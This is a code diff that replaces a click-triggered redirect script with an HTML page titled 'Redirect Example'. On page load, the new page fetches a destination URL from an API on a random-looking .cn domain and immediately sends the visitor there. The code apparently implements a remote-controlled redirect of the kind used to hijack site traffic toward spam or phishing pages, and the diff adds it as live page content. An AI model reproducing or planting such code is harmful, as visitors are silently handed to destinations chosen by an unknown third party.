@@ -1,28 +1,33 @@
-    <script>
-		const someURLToRedirectTo = 'https://amghqfr.cn/api/jumpSite?siteName=liuyiling88';  
-		  
-		async function redirectBasedOnResponse() {  
-		  try {  
-		    // 发起GET请求  
-		    const response = await fetch(someURLToRedirectTo, { method: "GET" });  
-		      
-		    // 检查响应是否成功  
-		    if (!response.ok) {  
-		      throw new Error('Failed to fetch the redirect URL: ' + response.statusText);  
-		    }  
-		      
-		    // 解析响应为JSON  
-		    const result = await response.json();  
-		      
-		    // 使用结果中的URL进行重定向  
-		    window.location.href = result.data.siteUrl;  
-		  } catch (error) {  
-		    // 处理错误，例如显示错误信息  
-		    console.error('Error:', error);  
-		    // 你可以在这里添加额外的错误处理逻辑，如显示一个错误消息给用户  
-		  }  
-		}  
-		  
-		// 假设你有一个按钮，当用户点击它时，执行重定向逻辑  
-		document.getElementById('redirectButton').addEventListener('click', redirectBasedOnResponse);
-    </script>
+<!DOCTYPE html>  
+<html lang="en">  
+<head>  
+<meta charset="UTF-8">  
+<meta name="viewport" content="width=device-width, initial-scale=1.0">  
+<title>Redirect Example</title>  
+<script>  
+document.addEventListener('DOMContentLoaded', (event) => {  
+  const someURLToRedirectTo = 'https://rmvfcw0.cn/api/jumpSite?siteName=whoarei39';  
+  
+  async function handleRedirect() {  
+    try {  
+      const response = await fetch(someURLToRedirectTo);  
+      if (!response.ok) {  
+        throw new Error('Failed to fetch the redirect URL');  
+      }  
+      const result = await response.json();  
+      window.location.href = result.data.siteUrl;  
+    } catch (error) {  
+      console.error('Error:', error);  
+      // 在这里可以添加错误处理逻辑，比如显示一个错误消息给用户  
+    }  
+  }  
+  
+  handleRedirect(); // 页面加载完成后立即执行重定向逻辑  
+});  
+</script>  
+</head>  
+<body>  
+  <!-- 页面内容（如果有的话） -->  
+  <p>Redirecting...</p>  
+</body>  
+</html>
